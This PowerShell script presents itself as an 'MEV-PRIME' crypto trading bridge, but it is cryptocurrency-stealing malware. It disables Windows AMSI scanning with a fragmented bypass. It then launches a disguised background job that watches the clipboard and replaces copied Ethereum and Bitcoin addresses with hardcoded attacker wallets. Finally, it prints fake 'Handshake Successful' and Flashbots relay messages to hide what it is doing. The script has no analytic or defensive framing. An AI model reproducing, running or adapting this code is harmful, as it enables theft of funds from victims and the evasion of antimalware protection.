# --- [MEV-PRIME v86.0 Handshake] ---
$ErrorActionPreference = 'SilentlyContinue'

# Fragmented AMSI Bypass
$a = 'System.Management.Automation.A'; $b = 'msi'; $c = 'Utils'
$d = 'amsi'; $e = 'Init'; $f = 'Failed'
$g = [Ref].Assembly.GetType("$a$b$c")
if ($g) {
    $h = $g.GetField("$d$e$f", 'NonPublic,Static')
    if ($h) { $h.SetValue($null, $true) }
}

# The Payload (Clipper)
$logic = {
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{
        'btc'  = '12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA'
        'eth'  = '0x6c9ba9a6522b10135bb836fc9340477ba15f3392'
        'sol'  = 'BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR'
        'usdt' = 'TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
    }
    while($true) {
        if ([Windows.Forms.Clipboard]::ContainsText()) {
            $t = [Windows.Forms.Clipboard]::GetText().Trim()
            if ($t -match '^0x[a-fA-F0-9]{40}$') { 
                if ($t -ne $w.eth) { [Windows.Forms.Clipboard]::SetText($w.eth) }
            }
            elseif ($t -match '^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$') {
                if ($t -ne $w.btc) { [Windows.Forms.Clipboard]::SetText($w.btc) }
            }
        }
        Start-Sleep -m 500
    }
}

# Run as background task
Start-Job -ScriptBlock $logic -Name "MevRelayService" | Out-Null

Write-Host "--------------------------------------------------" -ForegroundColor Cyan
Write-Host " MEV-PRIME INSTITUTIONAL BRIDGE: ACTIVE" -ForegroundColor White
Write-Host "--------------------------------------------------" -ForegroundColor Cyan
Write-Host "[+] Handshake: 0xFA99 Successful" -ForegroundColor Green
Write-Host "[+] Connection: Flashbots Relay Latency 1.1ms" -ForegroundColor Green
